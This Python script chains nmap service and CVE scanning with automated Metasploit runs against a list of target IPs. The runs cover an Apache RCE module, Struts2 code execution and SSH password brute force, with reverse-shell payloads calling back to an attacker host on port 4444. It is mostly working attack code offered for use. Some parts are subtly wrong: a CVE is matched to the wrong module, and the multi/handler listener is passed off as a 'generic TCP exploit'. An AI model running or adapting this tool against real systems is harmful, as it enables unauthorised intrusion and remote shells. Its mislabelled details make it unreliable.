import re
import subprocess
import xml.etree.ElementTree as ET
from datetime import datetime
import threading

# Config
TARGET_IPS = ["172.21.0.2", "172.21.0.3", "172.21.0.4"] # Target IPs
LHOST = "172.20.0.2"                                    # Your Kali/attacker IP
LPORT = "4444"                                          # Listener port
LOG_FILE = f"pentest_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
METASPLOIT_SESSION_LOG = "msf_sessions.log"

def log(message):
    """Print and log messages."""
    print(message)
    with open(LOG_FILE, "a") as f:
        f.write(f"{datetime.now()}: {message}\n")

def run_nmap_scan(target_ip):
    """Run Nmap scan on a target IP."""
    log(f"[*] Scanning {target_ip}...")
    nmap_command = [
        "nmap",
        "-sV",                              # Service version detection
        "--script=vulners",                 # CVE detection
        "-p-",                              # Scan all ports
        "-T4",                              # Aggressive timing
        "-oX", f"nmap_{target_ip}.xml",     # Output XML per target
        target_ip
    ]
    try:
        subprocess.run(nmap_command, check=True, capture_output=True, text=True)
        log(f"[+] Nmap scan for {target_ip} completed.")
        return True
    except subprocess.CalledProcessError as e:
        log(f"[-] Nmap scan for {target_ip} failed: {e.stderr}")
        return False

def parse_nmap_results(target_ip):
    """Parse Nmap XML results for a target IP."""
    services = []
    try:
        tree = ET.parse(f"nmap_{target_ip}.xml")
        root = tree.getroot()

        for host in root.findall("host"):
            ip = host.find("address").get("addr")
            os_info = host.find("os/osmatch")
            os_guess = os_info.get("name") if os_info else "Unknown"

            for port in host.findall("ports/port"):
                port_num = port.get("portid")
                service = port.find("service")
                service_name = service.get("name") if service else "unknown"
                service_version = service.get("version") if service else "unknown"
                vulns = []

                # Extract CVEs from Nmap's vulners script
                for script in port.findall("script"):
                    if script.get("id") == "vulners":
                        for line in script.get("output", "").split("\n"):
                            if "CVE-" in line or "EXPLOIT" in line:
                                vulns.append(line.strip())

                services.append({
                    "host": ip,
                    "os": os_guess,
                    "port": port_num,
                    "service": service_name,
                    "version": service_version,
                    "vulns": vulns
                })

        return services
    except Exception as e:
        log(f"[-] Error parsing Nmap results for {target_ip}: {e}")
        return []

def get_exploits_for_service(service_info):
    """Generate exploits for a service based on CVEs and versions."""
    exploits = []

    # Apache HTTP Server
    if "http" in service_info["service"] and "apache" in service_info["version"].lower():
        exploits.extend([
            {
                "name": "Apache RCE (CVE-2023-25690)",
                "module": "exploit/multi/http/apache_normalize_path_rce",
                "options": {
                    "RHOSTS": service_info["host"],
                    "RPORT": service_info["port"],
                    "TARGETURI": "/",
                    "PAYLOAD": "cmd/unix/reverse",
                    "LHOST": LHOST,
                    "LPORT": LPORT
                }
            },
            {
                "name": "Apache Struts2 (CVE-2017-5638)",
                "module": "exploit/multi/http/struts2_code_exec",
                "options": {
                    "RHOSTS": service_info["host"],
                    "RPORT": service_info["port"],
                    "TARGETURI": "/"
                }
            }
        ])

    # SSH
    elif "ssh" in service_info["service"]:
        exploits.extend([
            {
                "name": "SSH Login Brute Force",
                "module": "auxiliary/scanner/ssh/ssh_login",
                "options": {
                    "RHOSTS": service_info["host"],
                    "RPORT": service_info["port"],
                    "USERNAME": "admin",
                    "PASSWORD": "password",
                    "STOP_ON_SUCCESS": "true"
                }
            }
        ])

    # Fallback: Generic TCP exploit
    exploits.append({
        "name": "Generic TCP Exploit",
        "module": "exploit/multi/handler",
        "options": {
            "RHOSTS": service_info["host"],
            "RPORT": service_info["port"],
            "PAYLOAD": "generic/shell_reverse_tcp",
            "LHOST": LHOST,
            "LPORT": LPORT
        }
    })

    return exploits

def launch_metasploit_attack(service_info):
    """Attempt all exploits for a service until one succeeds."""
    exploits = get_exploits_for_service(service_info)
    if not exploits:
        log(f"[-] No exploits for {service_info['service']} {service_info['version']}")
        return False

    for exploit in exploits:
        log(f"[*] [{service_info['host']}] Trying: {exploit['name']}")
        msf_commands = [
            "msfconsole",
            "-q",
            "-x",
            f"use {exploit['module']};",
            *[f"set {key} {value};" for key, value in exploit['options'].items()],
            "run;",
            f"sessions -l >> {METASPLOIT_SESSION_LOG};",
            "exit;"
        ]
        if execute_metasploit(msf_commands):
            log(f"[+] [{service_info['host']}] Success! Exploit: {exploit['name']}")
            return True
        else:
            log(f"[-] [{service_info['host']}] Failed: {exploit['name']}")

    log(f"[-] [{service_info['host']}] All exploits failed for this service.")
    return False

def execute_metasploit(commands):
    """Run Metasploit and check for success."""
    with open(LOG_FILE, "a") as log_file:
        process = subprocess.Popen(
            " ".join(commands),
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        stdout, stderr = process.communicate()
        log_file.write(f"\n=== Command Output ===\n{stdout}\n")
        if stderr:
            log_file.write(f"\n=== Errors ===\n{stderr}\n")
        
        return "Meterpreter session" in stdout or "Session created" in stdout

def attack_target(target_ip):
    """Full attack workflow for a single target."""
    log(f"\n[=== Targeting {target_ip} ===]")
    if not run_nmap_scan(target_ip):
        return

    services = parse_nmap_results(target_ip)
    if not services:
        log(f"[-] No services found on {target_ip}.")
        return

    log(f"[+] [{target_ip}] Found {len(services)} services:")
    for svc in services:
        log(f"  - Port {svc['port']}: {svc['service']} {svc['version']}")
        if svc["vulns"]:
            log(f"    Vulnerabilities: {', '.join(svc['vulns'])}")

    for svc in services:
        if launch_metasploit_attack(svc):
            break  # Stop if any exploit succeeds

if __name__ == "__main__":
    log("[*] Starting MULTI-NODE penetration test...")
    log(f"[*] Targets: {', '.join(TARGET_IPS)}")
    log("[*] Note: Authorized test. Exploiting all vulnerabilities.")

    # Run attacks in parallel threads
    threads = []
    for ip in TARGET_IPS:
        thread = threading.Thread(target=attack_target, args=(ip,))
        threads.append(thread)
        thread.start()

    # Wait for all threads to complete
    for thread in threads:
        thread.join()

    log("[+] Multi-node attack completed. Review logs for results.")
